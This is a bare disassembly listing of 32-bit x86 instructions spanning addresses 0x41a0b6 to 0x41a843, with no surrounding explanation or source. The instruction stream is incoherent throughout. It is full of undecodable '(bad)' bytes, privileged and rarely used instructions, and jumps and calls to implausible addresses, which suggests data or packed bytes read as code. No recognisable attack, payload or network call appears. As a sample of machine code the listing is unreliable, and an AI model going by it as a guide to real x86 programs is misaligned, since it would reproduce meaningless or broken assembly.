  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
